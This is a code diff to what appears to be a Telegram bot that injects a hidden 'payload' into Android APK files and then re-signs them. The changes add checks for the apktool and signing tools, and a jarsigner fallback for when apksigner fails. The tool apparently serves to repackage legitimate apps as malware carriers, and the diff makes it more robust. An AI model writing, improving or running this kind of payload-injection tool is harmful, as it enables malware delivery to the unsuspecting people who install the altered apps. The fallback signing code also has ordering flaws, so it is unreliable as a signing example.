@@ -33,6 +33,17 @@ except Exception as e:
     logger.error(f"Error loading payload: {e}")
 
 
+def check_tools():
+    for tool in ["apktool", "zipalign", "apksigner", "jarsigner", "keytool"]:
+        try:
+            subprocess.run([tool, "--help"], capture_output=True, timeout=5)
+            logger.info(f"Tool OK: {tool}")
+        except FileNotFoundError:
+            logger.warning(f"Tool MISSING: {tool}")
+        except Exception:
+            logger.info(f"Tool present: {tool}")
+
+
 def run_cmd(cmd, label):
     logger.info(f"[{label}] Running: {' '.join(cmd)}")
     result = subprocess.run(cmd, capture_output=True, text=True)
@@ -96,8 +107,8 @@ def inject_payload(apk_bytes):
 
             # STEP 5: Sign APK
             if KEYSTORE_PATH:
-                logger.info("Signing APK...")
-                if not run_cmd(
+                logger.info("Signing APK with apksigner...")
+                sign_ok = run_cmd(
                     [
                         "apksigner", "sign",
                         "--ks", KEYSTORE_PATH,
@@ -107,11 +118,29 @@ def inject_payload(apk_bytes):
                         str(aligned_apk),
                     ],
                     "sign"
-                ):
-                    return None
+                )
 
-                if not signed_apk.exists():
-                    logger.error("Signed APK not found")
+                # Fallback: use jarsigner if apksigner fails
+                if not sign_ok or not signed_apk.exists():
+                    logger.warning("apksigner failed, trying jarsigner fallback...")
+                    jarsigner_apk = tmp_path / "jarsigned.apk"
+                    sign_ok = run_cmd(
+                        [
+                            "jarsigner",
+                            "-keystore", KEYSTORE_PATH,
+                            "-storepass", KEYSTORE_PASS,
+                            "-keypass", KEYSTORE_PASS,
+                            str(aligned_apk),
+                            "release",
+                        ],
+                        "jarsigner"
+                    )
+                    if sign_ok:
+                        import shutil
+                        shutil.copy2(aligned_apk, signed_apk)
+
+                if not sign_ok or not signed_apk.exists():
+                    logger.error("All signing methods failed")
                     return None
 
                 with open(signed_apk, "rb") as f:
@@ -194,6 +223,7 @@ def main():
 
     logger.info(f"Token OK: {TOKEN[:10]}...")
     logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")
+    check_tools()
 
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
